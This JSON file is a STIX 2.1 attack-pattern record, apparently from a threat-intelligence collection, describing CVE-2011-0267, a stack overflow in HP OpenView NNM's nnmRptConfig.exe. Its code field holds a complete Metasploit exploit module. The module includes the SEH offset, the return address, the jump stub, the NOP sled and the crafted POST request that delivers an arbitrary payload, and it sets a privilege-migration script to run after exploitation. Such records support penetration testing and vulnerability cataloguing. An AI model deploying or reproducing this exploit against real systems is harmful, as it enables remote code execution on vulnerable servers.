{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cb2876e7-02ae-4760-96e5-db222303738e",
    "created": "2024-08-14T16:52:21.81237Z",
    "modified": "2024-08-14T16:52:21.812374Z",
    "name": "\"HP OpenView NNM nnmRptConfig.exe schdParams Buffer Overflow\"",
    "description": " This module exploits NNM's nnmRptConfig.exe. Similar to other NNM CGI bugs the overflow occurs during a ov.sprintf_new() call, which allows an attacker to overwrite data on the stack, and gain arbitrary code execution.  'License'     => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_nnm_nnmrptconfig_schdparams.rb",
            "external_id": "hp_nnm_nnmrptconfig_schdparams.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0267"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => \"HP OpenView NNM nnmRptConfig.exe schdParams Buffer Overflow\",\n      'Description' => %q{\n        This module exploits NNM's nnmRptConfig.exe. Similar to other NNM CGI bugs,\n        the overflow occurs during a ov.sprintf_new() call, which allows an attacker to\n        overwrite data on the stack, and gain arbitrary code execution.\n      },\n      'License'     => MSF_LICENSE,\n      'Author'      => ['sinn3r'],\n      'References'  =>\n        [\n          ['CVE', '2011-0267'],\n          ['OSVDB', '70473'],\n          ['ZDI', '11-009'],\n        ],\n      'Payload' =>\n        {\n          'BadChars' => \"\\x00\\x26\\x2b\",\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => \"seh\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          [\n            'NNM 7.53 - Windows Server 2003 Ent', {\n              'Ret'           => 0x5A30532D,  #POP/POP/RET OvWww.dll\n              'Offset'        => 46919,       #Offset to SEH chain\n              'Pops'          => 13,          #Number of POPADs needed to find a bigger space with our payload\n              'Payloadoffset' => 57,          #Offset to the payload\n          }],\n        ],\n      'DisclosureDate' => '2011-01-10'))\n  end\n\n  def exploit\n    nops = make_nops(1000)*70\n\n    sploit  = nops[0, target['Offset']]\n    sploit << generate_seh_record(target.ret)\n    sploit << \"\\x61\"*target['Pops']\n    sploit << \"\\xff\\xe1\"  #JMP ECX\n    sploit << nops[0, target['Payloadoffset']]\n    sploit << payload.encoded\n    sploit << nops[0, 70000-sploit.length]\n\n    data  = \"Content&Action=Create&\"\n    data << \"Template=Avail/CRAvail&\"\n    data << \"Operation=Apply&\"\n    data << \"Params=schdParams+nameParams&\"\n    data << \"schdParams=#{sploit}%7Cmonthtodate&\"\n    data << \"nameParams=text1%3DAAAA%26text2%3Dtest2test%26text3%3Dtest2 HTTP/1.1\"\n\n    connect\n    send_request_raw({\n      'uri'     => '/OvCgi/nnmRptConfig.exe',\n      'data'    => data,\n      'version' => '1.1',\n      'method'  => 'POST',\n      'headers' => {\n        'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n        'Accept-Language' => 'en-us,en;q=0.5',\n        'Accept-Encoding' => 'gzip,deflate',\n        'Accept-Chrarset' => 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',\n        'Keep-Alive'      => '300',\n        'Connection'      => 'Keep-Alive',\n        'Cache-Control'   => 'mag-age=0',\n        'Content-Type'    => 'application/x-www-form-urlencoded',\n      }\n    }, 3)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-01-10",
    "x_mitre_platforms": [
        "win'"
    ]
}